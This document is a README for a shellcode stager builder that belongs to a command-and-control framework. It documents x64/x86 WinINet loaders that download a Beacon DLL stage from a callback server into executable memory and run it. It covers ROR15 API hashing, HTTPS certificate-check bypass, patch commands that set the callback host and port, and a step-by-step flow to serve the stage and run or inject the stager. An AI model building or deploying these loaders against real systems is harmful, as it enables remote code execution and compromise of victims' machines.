# stager_shellcode

Language: [中文](README.md) | English

`stager_shellcode` builds x64/x86 WinINet HTTP/HTTPS stager templates.

The stager has a narrow responsibility:

1. Download the stage over HTTP or HTTPS.
2. Allocate executable memory.
3. Read the stage into memory in chunks.
4. Jump to the downloaded Beacon stage.

The downloaded stage is expected to be a Beacon DLL blob that has already been processed by reflective stub patching.

Current templates:

| Architecture | Source File | Output Template |
| --- | --- | --- |
| x64 | `stager_http_https.asm` | `x64\Release\stager_windows_amd64.bin` |
| x86 | `stager_http_https_x86.asm` | `x86\Release\stager_windows_32.bin` |

Both templates use the same design:

- Compact `STG2` configuration block.
- ROR15 API hashes.
- Unified patching through `tools\patch_stager_config`.
- HTTP / HTTPS support.
- Optional HTTPS certificate error bypass.
- `thread` / `process` exit modes.

## Requirements

### Required

| Dependency | Notes |
| --- | --- |
| Visual Studio 2017 or later | Visual Studio 2022 is recommended. |
| Desktop development with C++ | Required. |
| MSVC x64/x86 build tools | Used to link the stager EXE. |
| MASM | Used to compile `.asm` files. Installed with the C++ workload. |
| Windows 10 SDK or Windows 11 SDK | Required for Windows target builds. |

### Tooling

| Dependency | Notes |
| --- | --- |
| Go 1.21+ | Runs patch, extract, and hash tools under `tools`. |
| Python 3 | Only needed for HTTPS stage server testing. |
| OpenSSL | Optional. Used when the HTTPS stage server generates a self-signed certificate. |

Recommended Visual Studio Installer selections:

```text
Workloads:
  Desktop development with C++

Individual components:
  MSVC v143 or v142 C++ x64/x86 build tools
  Windows 10 SDK or Windows 11 SDK
  MASM
```

## Visual Studio Project

Project file:

```text
stager_shellcode.vcxproj
```

In Visual Studio Solution Explorer, `Source Files` should show:

```text
stager_http_https.asm
stager_http_https_x86.asm
```

Notes:

- The x64 platform builds only `stager_http_https.asm`.
- The Win32 platform builds only `stager_http_https_x86.asm`.
- Both asm files are visible in Visual Studio, but the file for the other architecture is excluded from the current build.

## Build

### Build x64 Template

```bat
build_stager_x64.bat
```

Output:

```text
x64\Release\stager_windows_amd64.exe
x64\Release\stager_windows_amd64.bin
```

### Build x86 Template

```bat
build_stager_x86.bat
```

Output:

```text
x86\Release\stager_windows_32.exe
x86\Release\stager_windows_32.bin
```

`.bin` is the raw shellcode template extracted from the `.text` section and is used for shellcode injection, `CreateThread`, and similar shellcode modes.

`.exe` is a PE template. After being patched with `patch_stager_config`, it can run independently and is useful for local validation and debugging.

After building, deploy the stager templates to the Server package:

```text
server\static\stager_templates\
├── stager_windows_amd64.bin
├── stager_windows_32.bin
├── stager_windows_amd64.exe
└── stager_windows_32.exe
```

Both `.bin` and `.exe` templates are needed in TeamServer's `static\stager_templates` directory:

- `.bin` is patched by TeamServer for shellcode mode.
- `.exe` is patched by TeamServer and can run as a standalone executable.

`extract_text` outputs the section `VirtualSize`, not the full `RawSize`, so linker alignment padding is not written into the final shellcode.

### Build Script Notes

The current build scripts call local Visual Studio `vcvars64.bat` / `vcvars32.bat`.

If another machine uses a different VS installation path, update:

```text
build_stager_x64.bat
build_stager_x86.bat
```

and adjust:

```bat
set "VCVARS=..."
```

You can also run MSBuild manually from a **Developer Command Prompt for VS**.

## Tools

```text
tools\
├── extract_text\
├── patch_stager_config\
├── rot15_hash\
└── https_stage_server\
```

### extract_text

Extracts a selected section from a PE file. The default section is `.text`.

Example:

```bat
go run .\tools\extract_text\main.go -in .\x64\Release\stager_windows_amd64.exe -out .\x64\Release\stager_windows_amd64.bin
```

Arguments:

| Argument | Notes |
| --- | --- |
| `-in` | Input PE file. |
| `-out` | Output raw section file. |
| `-section` | Section to extract. Defaults to `.text`. |

### patch_stager_config

Patches the `STG2` configuration block in a stager template.

Common arguments:

| Argument | Notes |
| --- | --- |
| `-in` | Input stager template, `.bin` or `.exe`. |
| `-out` | Patched output stager. |
| `-scheme http|https` | Transport scheme. |
| `-https` | HTTPS shortcut. Do not use together with `-scheme`. |
| `-ignore-cert` | Ignore common HTTPS certificate errors. |
| `-host` / `-callback-host` | Stage server host. |
| `-port` | Stage server port. |
| `-base-uri` | Object path prefix. |
| `-stage-id` | Stage identifier. Must not contain `/` or `\`. |
| `-stage-max` | Maximum stage allocation size. Decimal and `0x` values are supported. |
| `-chunk` | Download chunk size. |
| `-exit-mode` | `thread` or `process`. |

The `STG2` template does not support custom User-Agent or extra headers:

- `-ua` is ignored with a warning.
- `-headers` returns an error.

### rot15_hash

Generates ROR15 API hashes used by the stager.

Normal output:

```bat
go run .\tools\rot15_hash\main.go kernel32.dll LoadLibraryA
```

MASM `equ` output:

```bat
go run .\tools\rot15_hash\main.go -equ wininet.dll InternetOpenA
```

Algorithm:

```text
combined = Rot15(module unicode bytes, uppercase ASCII) + Rot15(function ascii)
```

Both x64 and x86 stagers use this hash algorithm.

### https_stage_server

Used for local HTTPS stage download testing.

Example:

```powershell
python .\tools\https_stage_server\serve_https.py `
  --bind 0.0.0.0 `
  --port 9999 `
  --stage C:\tmp\Beacon_stage.bin `
  --uri /assets/stg_01a657b5b9838e731d89e7b399c32147/stage.bin
```

If certificate files do not exist, the server tries to generate a self-signed certificate with OpenSSL.

## Patch Examples

### x64 HTTP Shellcode

```bat
go run .\tools\patch_stager_config\main.go -in .\x64\Release\stager_windows_amd64.bin -out .\x64\Release\stager_http_x64.bin -scheme http -host 192.168.18.1 -port 9999 -base-uri /assets -stage-id stg_01a657b5b9838e731d89e7b399c32147 -exit-mode thread
```

### x64 HTTPS Shellcode

```bat
go run .\tools\patch_stager_config\main.go -in .\x64\Release\stager_windows_amd64.bin -out .\x64\Release\stager_https_x64.bin -scheme https -ignore-cert -host 192.168.18.1 -port 9999 -base-uri /assets -stage-id stg_01a657b5b9838e731d89e7b399c32147 -exit-mode thread
```

### x86 HTTP Shellcode

```bat
go run .\tools\patch_stager_config\main.go -in .\x86\Release\stager_windows_32.bin -out .\x86\Release\stager_http_x86.bin -scheme http -host 192.168.18.1 -port 9999 -base-uri /assets -stage-id stg_01a657b5b9838e731d89e7b399c32147 -exit-mode thread
```

### x86 HTTPS Shellcode

```bat
go run .\tools\patch_stager_config\main.go -in .\x86\Release\stager_windows_32.bin -out .\x86\Release\stager_https_x86.bin -scheme https -ignore-cert -host 192.168.18.1 -port 9999 -base-uri /assets -stage-id stg_01a657b5b9838e731d89e7b399c32147 -exit-mode thread
```

## Patch EXE Template And Run Standalone

The patch tool searches for the `STG2` configuration block in the input file, so both `.bin` and `.exe` inputs are supported.

Differences:

| Input | Output | Usage |
| --- | --- | --- |
| `stager_windows_amd64.bin` / `stager_windows_32.bin` | patched `.bin` | Shellcode mode. |
| `stager_windows_amd64.exe` / `stager_windows_32.exe` | patched `.exe` | Standalone execution mode. |

For standalone EXE stager testing, use:

```text
-exit-mode process
```

Example:

```bat
go run .\tools\patch_stager_config\main.go -in .\x64\Release\stager_windows_amd64.exe -out .\x64\Release\stager_http_x64.exe -scheme http -host 192.168.18.1 -port 9999 -base-uri /assets -stage-id stg_01a657b5b9838e731d89e7b399c32147 -exit-mode process
```

Raw shellcode injection or `CreateThread` scenarios usually use:

```text
-exit-mode thread
```

## Stage URL Rule

Final request URL:

```text
<scheme>://<host>:<port><object_path>
```

The `STG2` template stores the full `object_path`. The patcher builds it from:

```text
-base-uri
-stage-id
```

Result:

```text
<base-uri>/<stage-id>/stage.bin
```

Example:

```text
http://192.168.18.1:9999/assets/stg_01a657b5b9838e731d89e7b399c32147/stage.bin
```

## Architecture Matching

The stager and the downloaded Beacon stage must use the same architecture:

```text
x64 stager -> x64 Beacon stage
x86 stager -> x86 Beacon stage
```

Do not use an x86 stager to download an x64 stage, or the reverse.

## Recommended Flow

```text
1. Build Beacon DLL.
2. Apply reflective stub patching to the Beacon DLL and produce the Beacon stage blob.
3. Build the stager template.
4. Patch stager configuration.
5. Start the stage server.
6. Run or inject the stager.
```

Minimal command flow:

```bat
build_stager_x64.bat

go run .\tools\patch_stager_config\main.go -in .\x64\Release\stager_windows_amd64.bin -out .\x64\Release\stager_http_x64.bin -scheme http -host 192.168.18.1 -port 9999 -base-uri /assets -stage-id stg_01a657b5b9838e731d89e7b399c32147 -exit-mode thread
```
